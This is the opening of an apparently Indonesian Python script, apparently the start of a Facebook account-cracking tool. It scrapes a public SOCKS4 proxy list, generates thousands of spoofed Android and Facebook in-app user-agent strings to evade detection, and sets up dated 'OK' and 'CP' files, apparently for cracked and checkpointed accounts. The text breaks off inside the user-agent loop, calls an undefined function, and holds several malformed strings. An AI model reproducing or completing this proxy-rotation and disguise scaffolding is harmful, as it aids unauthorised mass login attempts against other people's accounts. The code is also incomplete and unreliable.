#######################Rizki xD#######################Rizkii
import requests,re,time,os,sys,rich,random,datetime
from requests import get as Tamsis
from time import sleep as bobo
from rich import print as cetak
from concurrent.futures import ThreadPoolExecutor as ThreadPool
from os import system as termux
from rich.panel import Panel as pnl
termux('clear')
umur=[]
cok=[]
token=[]
uaa=[]
metode=[]
loop=0
try:os.mkdir('Rizkii')
except:pass
sys.stdout.write('\x1b]2; Rizkii-XD \x07')
cp=0
ok=0
id=[]
uid=[]
tg = datetime.datetime.now().day
bl = datetime.datetime.now().month
th = datetime.datetime.now().year
svo = 'OK-'+str(tg)+'-'+str(bl)+'-'+str(th)+'.txt'
svc = 'CP-'+str(tg)+'-'+str(bl)+'-'+str(th)+'.txt'
try:
	proxylist= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
	open('pxy.txt','w').write(proxylist)
except Exception as e:
	bra_anim(f'Nyalain data Suhu')
bro=open('pxy.txt','r').read().splitlines()
limitd=0
for agenkuw in range(10000):
	a='Mozilla/5.0 (Linux; Android'
	b=random.choice(['8.1.0','9','10','11','12'])
	c='CPH2109'
	d='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	e=random.randrange(83,103)
	f='0'
	g=random.randrange(4200,4900)
	h=random.randrange(40,150)
	i='Safari/537.36'
	uakuh=f'{a} {b}; {c} {d}{e}.{f}.{g}.{h} {i}'
	uaa.append(uakuh)	
	a='Mozilla/5.0 (Linux; Android'
	b=random.choice(['8.1.0','9','10','11','12'])
	c='CPH2089'
	d='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	e=random.randrange(83,103)
	f='0'
	g=random.randrange(4200,4900)
	h=random.randrange(40,150)
	i='Safari/537.36'
	uakuh=f'{a} {b}; {c} {d}{e}.{f}.{g}.{h} {i}'
	uaa.append(uakuh)	
	a='Mozilla/5.0 (Linux; Android 11; '
	b=random.randrange(1, 9)
	c=random.randrange(1, 9)
	d='J8_EEA)'
	e=random.randrange(100, 9999)
	f='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0'
	g=random.randrange(1, 9)
	h=random.randrange(1, 4)
	i=random.randrange(1, 4)
	j=random.randrange(1, 4)
	k='Safari/537.36'
	uaku2=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
	uaa.append(uaku2)	
	a='Mozilla/5.0 (Linux; Android 12;'
	b=random.randrange(1, 9)
	c=random.randrange(1, 9)
	d='SM-A536B Build/SP1A.210812.016; wv) '
	e=random.randrange(100, 9999)
	f='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.136 '
	g=random.randrange(1, 9)
	h=random.randrange(1, 4)
	i=random.randrange(1, 4)
	j=random.randrange(1, 4)
	k='Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/413.0.0.30.104;]'
	uakuh=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
	uaa.append(uakuh)	
	a='Mozilla/5.0 (Linux; Android 11;'
	b=random.randrange(1, 9)
	c=random.randrange(1, 9)
	d='es-mx; ZTE 8045 Build/RP1A.201005.001; wv)'
	e=random.randrange(100, 9999)
	f='AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/108.0.5359.61'
	g=random.randrange(1, 9)
	h=random.randrange(1, 4)
	i=random.randrange(1, 4)
	j=random.randrange(1, 4)
	k='Mobile Safari/537.36 MMS/ZTE-Android- MMS-V2.0'
	uaku2=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
	uaa.append(uaku2)	
	a='Mozilla/5.0 (Linux; Android 12; '
	b=random.randrange(1, 9)
	c=random.randrange(1, 9)
	d='CPH2127 Build/RKQ1.211119.001; wv) '
	e=random.randrange(100, 9999)
	f='AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/113.0.5672.76 '
	g=random.randrange(1, 9)
	h=random.randrange(1, 4)
	i=random.randrange(1, 4)
	j=random.randrange(1, 4)
	k='Mobile Safari/537.36 JsSdk/2 NewsArticle/8.1.7 NetType/wifi'
	uakuh=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
	uaa.append(uakuh)	
	a='Mozilla/5.0 (Linux; Android 8.1.0;'
	b=random.randrange(1, 9)
	c=random.randrange(1, 9)
	d='CPH1809 Build/OPM1.171019.026; wv)'
	e=random.randrange(100, 9999)
	f='AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/108.0.5359.128'
	g=random.randrange(1, 9)
	h=random.randrange(1, 4)
	i=random.randrange(1, 4)
	j=random.randrange(1, 4)
	k='Seluler Safari/537.36 [FB_IAB/Orca-Android;FBAV/ 396.0.0.14.82;]'
	uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
	uaa.append(uaku)	
	a='Mozilla/5.0 (Linux; U; Android 7.1.2;'
	b=random.randrange(1, 9)
	c=random.randrange(1, 9)
	d='Redmi 4A Build/N2G47H)'
	e=random.randrange(100, 9999)
	f='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/61.0.3163.128'
	g=random.randrange(1, 9)
	h=random.randrange(1, 4)
	i=random.randrange(1, 4)
	j=random.randrange(1, 4)
	k='Mobile Safari/537.36 XiaoMi/Mint Browser/1.3.3'
	uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
	uaa.append(uaku)	
	a='Mozilla/5.0 (Linux; Android 12;'
	b=random.randrange(1, 9)
	c=random.randrange(1, 9)
	d='Infinix X670 Build/SP1A.210812.016; wv)'
	e=random.randrange(100, 9999)
	f='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.58'
	g=random.randrange(1, 9)
	h=random.randrange(1, 4)
	i=random.randrange(1, 4)
	j=random.randrange(1, 4)
	k='Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/411.1.0.29.112;]/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.135 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/411.1.0.29.112;]'
	uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
	uaa.append(uaku)	
	a='Mozilla/5.0 (Linux; Android'
	b=random.choice(['5.0''6.0','7.0','8.1.0','9','10','11','12'])
	c='Infinix X689)'
	d='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	e=random.randrange(73,100)
	f='0'
	g=random.randrange(4200,4900)
	h=random.randrange(40,150)
	i='Mobile Safari/537.36'
	uaku=(f'{a} {b}; {c} {d}{e}.{f}.{g}.{h} {i}')
	uaa.append(uaku)
	a='Mozilla/5.0 (Linux; Android'
	b=random.choice(['5.0''6.0','7.0','8.1.0','9','10','11','12'])
	c='vivo 1820 Build/O11019; wv)'
	d='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
	e=random.randrange(73,100)
	f='0'
	g=random.randrange(4200,4900)
	h=random.randrange(40,150)
	i='Safari/537.36 VivoBrowser/9.8.2.0'
	uakuh=f'{a} {b}; {c} {d}{e}.{f}.{g}.{h} {i}'
	uaa.append(uaku)
	a='Mozilla/5.0 (Linux; Android'
	b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
	c='Lenovo A7700 Build/MRA58K)'
	d='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	e=random.randrange(83,103)
	f='0'
	g=random.randrange(4200,4900)
	h=random.randrange(40,150)
	i='Mobile Safari/537.36'
	uaku=(f'{a} {b}; {c} {d}{e}.{f}.{g}.{h} {i}')
	uaa.append(uaku)
	a='Mozilla/5.0 (Linux; Android'
	b=random.choice(['6.0.1','7.1.1','8.1.0'])
	c='SM-G532M Build/MMB29T; wv) '
	d='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
	e=random.randrange(83,103)
	f='0'
	g=random.randrange(4200,4900)
	h=random.randrange(40,150)
	i='Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/398.0.0.21.105;]'
	uaku=(f'{a} {b}; {c} {d}{e}.{f}.{g}.{h} {i}')
	uaa.append(uaku)
	a='Mozilla/5.0 (Linux; Android'
	b=random.choice(['7.0','8.1.0','9','10','11','12'])
	c='CPH2071 Build/PPR1.180610.011; wv) '
	d='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
	e=random.randrange(83,103)
	f='0'
	g=random.randrange(4200,4900)
	h=random.randrange(40,150)
	i='Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/407.0.0.30.97;]'
	uaku=f'{a} {b}; {c} {d}{e}.{f}.{g}.{h} {i}'
	uaa.append(uaku)
	a='Mozilla/5.0 (Linux; Android'
	b=random.choice(['7.0','8.1.0','9','10','11','12'])
	c='Redmi Note 8)'
	d='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	e=random.randrange(83,103)
	f='0'
	g=random.randrange(4200,4900)
	h=random.randrange(40,150)
	i='Mobile Safari/537.36'
	uaku=(f'{a} {b}; {c} {d}{e}.{f}.{g}.{h} {i}')
	uaa.append(uaku)
	a='Mozilla/5.0 (Linux; Android'
	b=random.choice(['8.1.0','9','10','11','12','13'])
	c='Infinix X6511B)'
	d='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	e=random.randrange(73,100)
	f='0'
	g=random.randrange(4200,4900)
	h=random.randrange(40,150)
	i='Mobile Safari/537.36'
	uaku=(f'{a} {b}; {c} {d}{e}.{f}.{g}.{h} {i}')
	uaa.append(uaku)
	aa='Mozilla/5.0 (Linux; Android 11.1;'
	b=random.choice(['6','7','8','9','10','11','12'])
	c='TVBOX-5G) '
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 '
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Safari/537.36'
	uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
	uaa.append(uaku2)
	aa='Mozilla/5.0 (Linux; Android 8.1.0; '
	b=random.choice(['6','7','8','9','10','11','12'])
	c='Redmi 5 Plus Build/OPM1.171019.019; wv) '
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.135'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/413.0.0.30.104;]'
	uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
	uaa.append(uaku2)
	aa='Mozilla/5.0 (Linux; Android 13;'
	b=random.choice(['4.3','5.0','7.0','8.1.0','9','10','11','12','13'])
	c='CPH2273 Build/TP1A.220905.001; wv) '
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.170'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/412.0.0.22.115;]'
	uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
	uaa.append(uaku2)
	aa='Mozilla/5.0 (Linux; Android 10; '
	b=random.choice(['7.0','8.1.0','9','10','11','12'])
	c=random.choice(['moto e(7) plus Build/QPZS30.30-Q3-38-69-12; wv)'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.135'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36 [FBAN/EMA;FBLC/it_IT;FBAV/353.0.0.5.112;FBDM/DisplayMetrics'+'{density=1.75, width=720, height=1473, scaledDensity=1.75, xdpi=268.941, ydpi=269.139};]'
	uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
	uaa.append(uaku2)
	aa='Mozilla/5.0 (Linux; U; Android 7.1.2;'
	b=random.choice(['7.0','8.1.0','9','10','11','12'])
	c=random.choice(['zh-cn; Redmi 5 Plus Build/N2G47H)'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/61.0.3163.128'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36 XiaoMi/MiuiBrowser/10.1.1'
	uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
	uaa.append(uaku2)
	aa='Mozilla/5.0 (Linux; Android 8.1.0;'
	b=random.choice(['6','7','8','9','10','11','12'])
	c='Redmi 5 Plus Build/OPM1.171019.019; ru-ru)'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36 Puffin/9.7.2.51367AP'
	uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
	uaa.append(uaku2)
	aa='Mozilla/5.0 (Linux; Android 8.1.0;'
	b=random.choice(['6','7','8','9','10','11','12'])
	c='9; CPH1825)P259E)'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.77.0.4152.48.4264.57'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
	uaa.append(uaku2)
	aa='Mozilla/5.0 (Linux; Android 8.1.0;'
	b=random.choice(['6','7','8','9','10','11','12'])
	c='CPH1825)'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.4152.48'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
	uaa.append(uaku2)
	aa='Mozilla/5.0 (Linux; Android 9;'
	b=random.choice(['7.0','8.1.0','9','10','11','12'])
	c=random.choice(['SM-J120H Build/PKQ1.130176.001; wv)'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.5510.79'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
	uaa.append(uaku2)
	aa='Mozilla/5.0 (Linux; U; Android 8.1.0;'
	b=random.choice(['6','7','8','9','10','11','12'])
	c='en-us; OPPO PBBT30 Build/OPM1.171019.026)'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/53.0.2785.134'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36 OppoBrowser/4.7. 9'
	uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
	uaa.append(uaku2)
	aa='Mozilla/5.0 (Linux; Android 8.1.0;'
	b=random.choice(['6','7','8','9','10','11','12'])
	c='PBAM00 Build/OPM1.171019.026; wv)'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/109.0.5414.117'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Seluler Safari/537.36 [FB_IAB/FB4A;FBAV/391.1. 0.37.104;]'
	uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
	uaa.append(uaku2)
	aa='Mozilla/5.0 (Linux; Android'
	b=random.choice(['2.3.6;','4.0.4;','4.2.1;','4.2.2;','4.3;','4.4.2;','4.4.4;','5.0;','5.0.2;','5.1;','5.1.1;','6.0;','6;','6.0.1;','7.0.1;','7;','8;','8.0;','5.0','6.0','7.0','8.1.0','9','10','11','12'])
	c=random.choice(['meizu C9 Build/OPM2.171019.012; wv)'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
	uaa.append(uaku2)
	a='Mozilla/5.0 (Linux; Android 10;'
	b=random.randrange(1, 9)
	c=random.randrange(1, 9)
	d='CPH2239)'
	e=random.randrange(100, 9999)
	f='AppleWebKit/537.36 (KHTML, like Gecko)'
	g=random.randrange(1, 9)
	h=random.randrange(1, 4)
	i=random.randrange(1, 4)
	j=random.randrange(1, 4)
	k='Chrome/87.0.4280.101 Mobile Safari/537.36'
	uakuh=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
	uaa.append(uakuh)
	a='Mozilla/5.0 (Linux; Android 7.1.2; Redmi 4A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	b=random.randrange(100, 9999)
	c=random.randrange(100, 9999)
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	h=random.randrange(1, 9)
	i='Linux; Android 7.1.2; Redmi 4A)'
	j=random.randrange(1, 9)
	k=random.randrange(1, 9)
	l='Mobile Safari/E7FBAF'
	uaku2=(f'{a}{b}/{c}{d}{e}{f}{g}{h}{i}{j}.{k} {l}')
	uaa.append(uaku2)
	aa='Mozilla/5.0 (Linux; U; Android 8.1.0; '
	b=random.choice(['6','7','8','9','10','11','12'])
	c='it-it; Redmi 5 Plus Build/OPM1.171019.019) '
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/71.0.3578.141'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36 XiaoMi/MiuiBrowser/10.9.8-g'
	uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
	uaa.append(uaku2)
	aa='Mozilla/5.0 (Linux; Android 8.1.0;'
	b=random.choice(['4.3','5.0','7.0','8.1.0','9','10','11','12','13'])
	c='Redmi 5 Plus Build/OPM1.171019.019) '
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.85'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
	uaa.append(uaku2)
	aa='Mozilla/5.0 (Linux; Android 7.1.2; '
	b=random.choice(['7.0','8.1.0','9','10','11','12'])
	c=random.choice(['Redmi 5 Plus Build/N2G47H; ru-ru)'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 '
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36 Puffin/9.7.2.51367AP'
	uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
	uaa.append(uaku2)
	aa='Mozilla/5.0 (Linux; U; Android 7.1.2;'
	b=random.choice(['7.0','8.1.0','9','10','11','12'])
	c=random.choice(['zh-cn; Redmi 5 Plus Build/N2G47H) '])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/61.0.3163.128'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36 XiaoMi/MiuiBrowser/10.1.1'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	uaa.append(uaku2)
	aa='Mozilla/5.0 (Linux; Android 8.1.0; '
	b=random.choice(['6','7','8','9','10','11','12'])
	c='Redmi 5 Plus Build/OPM1.171019.019; ru-ru)'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36 Puffin/9.7.2.51367AP'
	uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
	uaa.append(uaku2)
	aa='Mozilla/5.0 (X11;'
	b=random.choice(['6','7','8','9','10','11','12'])
	c='Linux x86_64)'
